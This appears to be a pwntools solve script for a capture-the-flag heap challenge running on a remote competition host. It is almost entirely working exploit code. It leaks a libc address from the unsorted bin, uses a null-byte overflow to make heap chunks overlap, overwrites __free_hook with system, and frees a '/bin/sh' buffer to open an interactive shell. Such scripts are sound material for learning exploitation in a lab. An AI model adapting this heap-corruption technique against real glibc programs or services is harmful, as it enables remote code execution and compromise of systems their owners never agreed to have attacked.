#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./chall_patched')
host = 'mc.ax'
port = 32526

libc = ELF('./libc.so.6')
ld = ELF('./ld-2.27.so')
# rop = ROP(exe)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe



# Run without randomization
# python3 solve.py GDB NOASLR



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        # return gdb.debug([ld.path, exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": libc.path})
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": libc.path})
    elif args.REMOTE:
        return remote(host, port)
    else:
        # return process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
        return process([exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})

gdbscript = '''
b *main
b *print_menu
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def str(io, s, length):
    io.sendline(b'1')
    io.sendlineafter(b'size? ', length)
    io.sendlineafter(b'str? ', s)
    
def tok(io, idx, delim):
    io.sendline(b'2')
    io.sendlineafter(b'idx? ', idx)
    io.sendlineafter(b'delim? ', delim)
    
def delete(io, idx):
    io.sendline(b'3')
    io.sendlineafter(b'idx? ', idx)

def solve():
    io = conn()
    io.recv()
    
    # ------ LIBC LEAK ------ 
    log.info("Create large chunk")
    str(io, b'A', b'1496')
    
    log.info("Create barrier chunk to prevent consolidation")
    str(io, b'x'*0x28, b'40')
    
    log.info("Free -> unsorted bin")
    delete(io, b'0')
    
    log.info("Create another chunk of same size")
    str(io, b'C'*7, b'1496')

    log.info("libc leak")
    tok(io, b'0', b'\x0a')
    
    io.recvuntil(b'\n')
    
    libc_leak = u64(io.recv(6) + b'\x00\x00')
    libc.address = libc_leak - libc.sym['main_arena'] - 96
    free_hook = libc.sym['__free_hook']
    log.success("Libc leak: " + hex(libc_leak))
    log.success("Libc base: " + hex(libc.address))
    log.success("__free_hook: " + hex(free_hook))
    
    # ------ NULL BYTE POISONING ------
    log.info("Begin Null byte poisoning")
    
    log.info("Create chunks a, b, c, barrier")
    str(io, b'A'*0x4f8, '{:d}'.format(0x4f8).encode())
    str(io, b'B'*0x68, '{:d}'.format(0x68).encode())
    str(io, b'C'*0x4f8, '{:d}'.format(0x4f8).encode())
    str(io, b'x'*0x28, '{:d}'.format(0x28).encode())
    
    log.info("Free a")
    delete(io, b'2')
    
    log.info("Set C prev-in-use to 0 via null byte overflow")
    tok(io, b'3', b'\x01')
    
    log.info("Delete b")
    delete(io, b'3')
    
    log.info("Create b again and write 0x570 to prev_size")
    str(io, b'p'*0x60 + p64(0x570), '{:d}'.format(0x68).encode())
    
    log.info("Free b")
    delete(io, b'2')
    
    log.info("Delete c - cause consolidation")
    delete(io, b'4')
    
    log.info("Create bigger a to overlap with freed b")
    str(io, b'q'*0x500 + p64(free_hook), '{:d}'.format(0x568).encode())
    
    # ------ OVERWRITE __FREE_HOOK ------
    str(io, b'junk', '{:d}'.format(0x68).encode())
     
    log.info("Overwrite __free_hook with system")
    str(io, p64(libc.sym['system']), '{:d}'.format(0x68).encode())
    
    # ------ GET SHELL ------
    log.info("Get shell")
    str(io, b'/bin/sh\x00', '{:d}'.format(0x28).encode())
    
    delete(io, b'6')
    
    io.interactive()
    
if __name__ == "__main__":
    solve()


